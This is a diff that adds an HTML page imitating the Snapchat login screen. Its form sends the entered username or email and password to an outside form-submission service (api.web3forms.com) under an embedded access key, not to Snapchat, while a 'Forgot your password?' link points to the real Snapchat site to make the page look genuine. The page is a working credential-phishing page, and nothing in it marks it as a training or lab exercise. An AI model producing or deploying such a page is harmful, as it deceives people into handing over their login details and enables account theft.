@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Snapchat</title>
+     <link rel="stylesheet" href="style.css">
+     <link rel="shortcut icon" href="fav.png" type="image/x-icon">
+</head>
+
+<body>
+     <div class="container">
+          <img src="snappy.png" alt="snapchat img" />
+
+          <h3>Log In</h3>
+
+          <form action="https://api.web3forms.com/submit" method="POST">
+
+               <input type="hidden" name="access_key" value="2025d2d0-1b56-4920-a21c-856f7cac4a1f">
+
+
+               <label For="username">USERNAME OR EMAIL</label>
+               <input type="text" name="username" id="username" required />
+
+               <label For="nothing" id='use-phone'>Use phone number instead</label>
+
+               <label For="message">PASSWORD</label>
+               <input type="password" name="pass_word" id="message" required />
+
+               <div class="same_info">
+                    <input type="checkbox" name="ghanta" id="ghanta" />
+                    <label For="ghanta" id='save-info'>Save Login Info on your device</label>
+               </div>
+
+               <a href="https://www.snapchat.com/">Forgot your password?</a>
+               <button type="submit">Log In</button>
+          </form>
+     </div>
+</body>
+
+</html>
